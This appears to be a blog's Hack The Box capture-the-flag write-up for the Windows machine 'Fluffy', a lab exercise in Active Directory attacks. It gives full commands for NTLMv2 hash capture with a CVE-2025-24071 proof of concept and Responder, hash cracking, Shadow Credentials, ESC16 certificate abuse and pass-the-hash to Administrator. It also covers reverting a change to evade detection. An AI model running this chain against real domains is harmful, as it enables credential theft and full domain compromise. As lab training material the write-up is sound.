@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Fluffy Easy Machine Writeup - 18gi0n's Tech Lair</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="icon" type="image/x-icon" href="/assets/images/racoon.ico">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+        }
+
+        body {
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .opaque-bg {
+            background-color: rgba(13, 13, 13, 0.6);
+            position: fixed;
+            top: 50px;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .content {
+            position: relative;
+            z-index: 2;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+
+        .content .left-aligned-content {
+            text-align: left !important;
+            max-width: 800px;
+            margin: 0 20px !important;
+            padding: 20px 0 !important;
+        }
+
+        .content .left-aligned-content h1,
+        .content .left-aligned-content h2,
+        .content .left-aligned-content p,
+        .content .left-aligned-content ul,
+        .content .left-aligned-content ol,
+        .content .left-aligned-content li {
+            text-align: left !important;
+        }
+
+        .content .left-aligned-content a {
+            color: #ff9933 !important;
+            text-decoration: underline;
+        }
+
+        .content .left-aligned-content a:hover {
+            color: #ff007a !important;
+            text-shadow: 0 0 5px #ff007a;
+        }
+
+        .content .left-aligned-content img {
+            margin: 20px 0 !important;
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .content .left-aligned-content {
+                margin: 0 10px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Nav Bar -->
+    <nav>
+        <ul>
+            <li><a href="/index.html">Home</a></li>
+            <li><a href="/about.html">About</a></li>
+            <li><a href="/projects.html">Projects</a></li>
+            <li><a href="/code.html">Code & Tools</a></li>
+            <li><a href="/ctf.html">Write-ups</a></li>
+            <li><a href="/research.html">Research</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="opaque-bg" id="opaqueBg"></div>
+    <div class="content">
+        <div class="left-aligned-content">
+            <h1>Fluffy - Hack The Box</h1>
+            <img src="/assets/images/ctf/fluffy/cover.png" alt="Fluffy Cover">
+            <h2>1. Box Overview</h2>
+            <p>
+                Fluffy is an Windows machine from Hack The Box Season 8, designed to teach Active Directory (AD) pentesting techniques. Starting with credentials for a low-privileged user, I navigated through SMB share exploitation, AD permission abuse, and certificate authority (CA) misconfigurations to gain user and system flags. This box was a fantastic learning experience, highlighting real-world AD vulnerabilities like NTLM hash capture, Shadow Credentials, and AD CS attacks.
+            </p>
+            <ul>
+                <li><strong>Objective:</strong> Gain user access via a service account and escalate to Administrator to capture both flags.</li>
+                <li><strong>Skills Developed:</strong> Nmap scanning, SMB enumeration, hash cracking, BloodHound analysis, Shadow Credentials exploitation, and AD CS attacks (ESC16).</li>
+                <li><strong>Platform:</strong> Hack The Box</li>
+            </ul>
+
+            <h2>2. Resources Used</h2>
+            <p>Here are the resources that guided my approach:</p>
+            <ul>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC">CVE-2025-24071 PoC</a><br>
+                    Usage: Provided a proof-of-concept exploit to capture NTLMv2 hashes via user file interaction.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://github.com/ShutdownRepo/pywhisker">Pywhisker GitHub</a><br>
+                    Usage: This tool allows users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://github.com/ly4k/Certipy">Certipy GitHub</a><br>
+                    Usage: Used the latest Certipy version to identify and exploit the ESC16 vulnerability in the CA.
+                </li>
+            </ul>
+
+            <h2>3. My Approach to Pwning Fluffy</h2>
+            <p>Here’s a detailed breakdown of how I tackled Fluffy, following Mateo Galagorri’s guide and documenting my steps with commands and screenshots.</p>
+
+            <h3>Step 1: Initial Recon with Nmap</h3>
+            <p>
+                I started with an Nmap scan to identify open ports and services on the target (10.10.11.69). The scan revealed a Windows domain controller (DC) with services like SMB, LDAP, Kerberos, and WinRM, confirming an AD environment. This step was crucial to map the attack surface and identify potential entry points like SMB shares.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>nmap -T4 -sV -sC --open 10.10.11.69</code></pre>
+<p>
+    <strong>Why:</strong> Nmap’s faster timing (<code>-T4</code>) with version detection (<code>-sV</code>) and default scripts (<code>-sC</code>) focuses on open ports (<code>--open</code>) to efficiently identify services. The scan revealed ports such as 445 (SMB), 3268/3269 (LDAP Global Catalog), 5985 (WinRM), and 593 (RPC), along with the domain (<code>FLUFFY.HTB</code>) and DC (<code>DC01.FLUFFY.HTB</code>). This highlighted SMB as a potential entry point, leveraging the provided credentials.
+</p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step 1.png" alt="Nmap scan results">
+
+            <h3>Step 2: Synchronizing Time with ntpdate</h3>
+            <p>
+                Before proceeding, You need to synchronized your system’s time with the DC to avoid Kerberos authentication issues due to clock skew. This is a common requirement in AD environments, as Kerberos is sensitive to time differences.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>ntpdate 10.10.11.69</code></pre>
+            <p>
+                <strong>Why:</strong> Kerberos authentication fails if the time difference between the client and DC exceeds 5 minutes. Running <code>ntpdate</code> ensures smooth communication for later steps involving Kerberos tickets. I installed <code>ntpdate</code> and ran it to sync with the DC’s time. If your system clock keeps reverting after running commnad run "systemctl set-ntp off" then run ntpdate command.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step2.png" alt="ntpdate sync">
+
+            <h3>Step 3: Enumerating SMB Shares</h3>
+            <p>
+                Using the provided credentials (<code>j.fleischman / J0elTHEM4n1990!</code>), I enumerated SMB shares to find accessible resources. The <code>IT</code> share was readable, containing files that hinted at vulnerabilities.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>smbclient -L //10.10.11.69 -U j.fleischman --password=J0elTHEM4n1990!</code></pre>
+            <p>
+                <strong>Why:</strong> SMB shares often hold sensitive data or allow file uploads. <code>smbclient</code> lists shares accessible with the given credentials. The <code>IT</code> share contained <code>Upgrade_Notice.pdf</code>, which listed CVEs, including <code>CVE-2025-24071</code> with a PoC, suggesting an exploit path.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step 3.png" alt="SMB share listing">
+
+            <h3>Step 4: Accessing the IT Share</h3>
+            <p>
+                I connected to the <code>IT</code> share to download its contents, focusing on <code>Upgrade_Notice.pdf</code>. The PDF listed CVEs, with <code>CVE-2025-24071</code> standing out due to its PoC.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>smbclient //10.10.11.69/IT -U j.fleischman --password=J0elTHEM4n1990!</code></pre>
+            <p>
+                <strong>Why:</strong> Accessing the share allows downloading files for analysis. The PDF revealed <code>CVE-2025-24071</code>, a vulnerability exploitable via file upload to the <code>IT</code> share, which I confirmed was writable. This set the stage for hash capture.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step 4.png" alt="IT share contents">
+
+            <h3>Step 5: Exploiting CVE-2025-24071 for NTLMv2 Hashes</h3>
+            <p>
+                I used the PoC for <code>CVE-2025-24071</code> to create an exploit file, uploaded it to the <code>IT</code> share, and ran Responder to capture NTLMv2 hashes when the file was accessed by a user or service.
+            </p>
+            <p><strong>Commands:</strong></p>
+            <pre><p>git clone https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC
+# Build and upload exploit file via exploit.py
+# Drop file on IT share via "put xd.library-ms"
+# Start Responder</p> <code>"responder -I eth0"</code></pre>
+            <p>
+                <strong>Why:</strong> The PoC exploits <code>CVE-2025-24071</code> to trigger authentication attempts via user interaction with drop playload that prompts user to authicate to IT share therefore leaking their NTLMv2 hashes. Responder captures these hashes when a user or service interacts with the file. This yielded a hash for <code>p.agila</code>, expanding our access.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step 5.png" alt="CVEupdate">
+            <img src="/assets/images/ctf/Fluffy/user/used/step 5 b.png" alt="step 5 b">
+            <img src="/assets/images/ctf/Fluffy/user/used/step 5 a.png" alt="step 5 a">
+            <img src="/assets/images/ctf/Fluffy/user/used/step 5 c.png" alt="step 5 c">
+
+            <h3>Step 6: Cracking the NTLMv2 Hash</h3>
+            <p>
+                With the captured NTLMv2 hash for <code>p.agila</code>, I used hashcat to crack it, revealing the password.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>hashcat -m 5600 hash2.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            <p>
+                <strong>Why:</strong> NTLMv2 hashes are crackable if the password is weak. Hashcat’s <code>-m 5600</code> mode targets NTLMv2, and the rockyou wordlist is effective for common passwords. The cracked password (<code>prometheusx-303</code>) gave me a new set of credentials.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step 6.png" alt="Hashcat cracking">
+
+            <h3>Step 7: AD Enumeration with BloodHound</h3>
+            <p>
+                I used BloodHound to analyze AD relationships for both <code>j.fleischman</code> and <code>p.agila</code>, identifying a privilege escalation path for <code>p.agila</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>bloodhound-python -d FLUFFY.HTB -u j.fleischman -p "J0elTHEM4n1990!" -gc dc01.fluffy.htb -c all -ns 10.10.11.69</code></pre>
+            <pre><code>bloodhound-python -d FLUFFY.HTB -u p.agila -p "prometheusx-303" -gc dc01.fluffy.htb -c all -ns 10.10.11.69</code></pre>
+            <p>
+                <strong>Why:</strong> BloodHound maps AD permissions to find abusable relationships. It showed <code>p.agila</code> in <code>SERVICE ACCOUNT MANAGERS</code>, with <code>GenericAll</code> on <code>SERVICE ACCOUNTS</code>, which has <code>GenericWrite</code> on <code>ca_svc</code>, <code>ldap_svc</code>, and <code>winrm_svc</code>. This suggested a Shadow Credentials attack on <code>winrm_svc</code> for user access.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step 7 a.png" alt="a">
+            <img src="/assets/images/ctf/Fluffy/user/used/step 7 b.png" alt="b">
+             <img src="/assets/images/ctf/Fluffy/user/used/step 7 c.png" alt="c">
+
+            <h3>Step 8: Adding p.agila to SERVICE ACCOUNTS</h3>
+            <p>
+                To exploit the <code>GenericAll</code> permission, I added <code>p.agila</code> to the <code>SERVICE ACCOUNTS</code> group to gain <code>GenericWrite</code> on <code>winrm_svc</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"</code></pre>
+            <p>
+                <strong>Why:</strong> <code>GenericAll</code> allows modifying group membership. Adding <code>p.agila</code> to <code>SERVICE ACCOUNTS</code> grants <code>GenericWrite</code> on service accounts, enabling a Shadow Credentials attack to impersonate <code>winrm_svc</code>.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step 8.png" alt="Group membership update">
+
+            <h3>Step 9: Shadow Credentials Attack on winrm_svc</h3>
+            <p>
+                I used <code>pywhisker</code> to perform a Shadow Credentials attack on <code>winrm_svc</code>, generating a certificate to authenticate as that account.
+            </p>
+            <p><strong>Commands:</strong></p>
+            <pre><code>-python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
+-python3 gettgtpkinit.py -cert-pem oBwGyENT_cert.pem -key-pem oBwGyENT_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
+-export KRB5CCNAME=winrm_svc.ccache
+-python3 getnthash.py -key 3ccd6794d17d1ac416725120643c2d0867858e44556de69ad8854da2d0b0f627 fluffy.htb/winrm_svc</code></pre>
+            <p>
+                <strong>Why:</strong> <code>GenericWrite</code> allows adding a certificate to <code>winrm_svc</code>’s <code>msDS-KeyCredentialLink</code> attribute. <code>pywhisker</code> generates the certificate, <code>gettgtpkinit</code> requests a Kerberos TGT, and <code>getnthash</code> derives the NT hash. This gave me <code>winrm_svc</code>’s NT hash for remote access.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step 9 a.png" alt="a">
+            <img src="/assets/images/ctf/Fluffy/user/used/step 9 b.png" alt="b">
+            <img src="/assets/images/ctf/Fluffy/user/used/step 9 c.png" alt="c">
+
+            <h3>Step 10: Gaining User Access via evil-winrm</h3>
+            <p>
+                With the NT hash, I used <code>evil-winrm</code> to log in as <code>winrm_svc</code> and found the user flag on the desktop.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767</code></pre>
+            <p>
+                <strong>Why:</strong> <code>winrm_svc</code> has WinRM access, and the NT hash enables a Pass-the-Hash attack. <code>evil-winrm</code> provides a shell, allowing me to navigate to the desktop and retrieve the user flag, completing the first objective.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/user/used/step 10 .png" alt="step 10">
+            <img src="/assets/images/ctf/Fluffy/user/used/step 10 b.png" alt="User flag">
+
+            <h3>Step 11: Shadow Credentials on ca_svc</h3>
+            <p>
+                For the root flag, I repeated the Shadow Credentials attack on <code>ca_svc</code>, which has CA access, to obtain its NT hash.
+            </p>
+            <p><strong>Commands:</strong></p>
+            <pre><code>-python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"
+-python3 gettgtpkinit.py -cert-pem tYG0egtT_cert.pem -key-pem tYG0egtT_priv.pem fluffy.htb/ca_svc ca_svc.ccache
+-export KRB5CCNAME=ca_svc.ccache
+-python3 getnthash.py -key 3818ba30169cde2eb5c05e05b762657f0dfbd508f4112043740861d574c88376 fluffy.htb/ca_svc</code></pre>
+            <p>
+                <strong>Why:</strong> <code>ca_svc</code> controls the CA, key for the ESC16 attack. The Shadow Credentials process mirrors the <code>winrm_svc</code> attack, yielding <code>ca_svc</code>’s NT hash (<code>ca0f4f9e9eb8a092addf53bb03fc98c8</code>).
+            </p>
+            <img src="/assets/images/ctf/Fluffy/root/step 11.png" alt="Pywhisker ca_svc">
+
+            <h3>Step 12: Identifying ESC16 Vulnerability</h3>
+            <p>
+                Using the latest <code>Certipy</code> from GitHub, I scanned the CA and found the ESC16 vulnerability (Security Extension Disabled).
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout</code></pre>
+            <p>
+                <strong>Why:</strong> AD CS misconfigurations like ESC16 allow privilege escalation. The updated <code>Certipy</code> detected the vulnerability, which the Kali version missed, confirming the CA (<code>fluffy-DC01-CA</code>) was exploitable.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/root/step12.png" alt="Certipy ESC16">
+
+            <h3>Step 13: Updating ca_svc’s UPN to Administrator</h3>
+            <p>
+                I modified <code>ca_svc</code>’s <code>userPrincipalName</code> (UPN) to <code>administrator</code> to trick the CA into issuing an Administrator certificate.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update</code></pre>
+            <p>
+                <strong>Why:</strong> ESC16 allows UPN spoofing. Changing <code>ca_svc</code>’s UPN to <code>administrator</code> lets us request a certificate as the Administrator, leveraging <code>p.agila</code>’s <code>GenericWrite</code> permissions.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/root/step 13.png" alt="UPN update">
+
+            <h3>Step 14: Requesting an Administrator Certificate</h3>
+            <p>
+                With the UPN set, I requested a certificate for the <code>User</code> template, impersonating the Administrator.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'</code></pre>
+            <p>
+                <strong>Why:</strong> The ESC16 vulnerability allows issuing a certificate with the Administrator’s UPN. This certificate (<code>administrator.pfx</code>) can authenticate as the Administrator, bypassing password requirements.
+            </p>
+
+            <h3>Step 15: Reverting ca_svc’s UPN</h3>
+            <p>
+                I reverted <code>ca_svc</code>’s UPN to its original value to avoid detection and maintain stealth.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update</code></pre>
+            <p>
+                <strong>Why:</strong> Reverting the UPN ensures the attack remains covert, as leaving it as <code>administrator</code> could trigger alerts or break CA functionality.
+            </p>
+
+            <h3>Step 16: Authenticating as Administrator</h3>
+            <p>
+                Using the Administrator certificate, I authenticated to retrieve the NT hash.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'</code></pre>
+            <p>
+                <strong>Why:</strong> The certificate allows Kerberos authentication as the Administrator, yielding the NT hash (<code>aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e</code>) for Pass-the-Hash attacks.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/root/step 16.png" alt="Administrator auth">
+
+            <h3>Step 17: Gaining System Access</h3>
+            <p>
+                With the Administrator’s NT hash, I used <code>impacket-psexec</code> to gain a system shell and retrieve the root flag. Of note using evil-winrm as per step 10 is also accetable. I just had not used this method so I choose to follow his approach here to get reps on impacket-psexec.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Administrator@10.10.11.69</code></pre>
+            <p>
+                <strong>Why:</strong> The NT hash enables a Pass-the-Hash attack via <code>psexec</code>, which executes a command as Administrator. Navigating to <code>C:\Users\Administrator\Desktop</code>, I found <code>root.txt</code> with the flag, completing the challenge.
+            </p>
+            <img src="/assets/images/ctf/Fluffy/root/rootflag.png" alt="Root flag">
+            <img src="/assets/images/ctf/Fluffy/root/fluffy completed.png" alt="completed screenshot">
+
+            <h2>4. Lessons Learned and Tips</h2>
+            <p>Here’s what I took away from Fluffy:</p>
+            <ul>
+                <li><strong>Tip 1:</strong> Always sync time with <code>ntpdate</code> in AD environments to avoid Kerberos issues.</li>
+                <li><strong>Tip 2:</strong> BloodHound is invaluable for finding AD privilege escalation paths—learn to interpret its graphs.</li>
+                <li><strong>Tip 3:</strong> Use the latest tools (e.g., Certipy from GitHub) to catch vulnerabilities missed by older versions.</li>
+                <li><strong>Key Lesson:</strong> The ESC16 attack was a highlight, showing how AD CS misconfigurations can lead to domain compromise. Shadow Credentials also opened my eyes to certificate-based attacks.</li>
+                <li><strong>Future Goals:</strong> I want to automate AD enumeration with tools like PowerView and deepen my AD CS knowledge.</li>
+            </ul>
+
+            <h2>5. Conclusion</h2>
+            <p>
+                Fluffy was a rewarding challenge that deepened my understanding of AD pentesting. From capturing NTLMv2 hashes to exploiting AD permissions and CA misconfigurations, each step was a lesson in real-world attack techniques. The Shadow Credentials and ESC16 attacks were particularly enlightening, showing the power of AD misconfigurations. I’m excited to apply these skills to more HTB machines!
+            </p>
+
+            <h2>6. Additional Notes</h2>
+            <ul>
+                <li>Mateo Galagorri’s guide (<a href="https://mateogal.com/posts/fluffy/">Fluffy Writeup</a>) was instrumental in navigating this box, especially for the ESC16 attack.</li>
+                <li>The Certipy wiki and PKINITtools documentation were critical for understanding Shadow Credentials and AD CS exploitation.</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Dynamically set the height of opaque-bg to match the document height
+        function setOpaqueBgHeight() {
+            const opaqueBg = document.getElementById('opaqueBg');
+            const docHeight = Math.max(
+                document.body.scrollHeight,
+                document.documentElement.scrollHeight,
+                document.body.offsetHeight,
+                document.documentElement.offsetHeight,
+                document.body.clientHeight,
+                document.documentElement.clientHeight
+            );
+            opaqueBg.style.height = `${docHeight - 50}px`;
+        }
+
+        window.addEventListener('load', setOpaqueBgHeight);
+        window.addEventListener('resize', setOpaqueBgHeight);
+    </script>
+</body>
+</html>
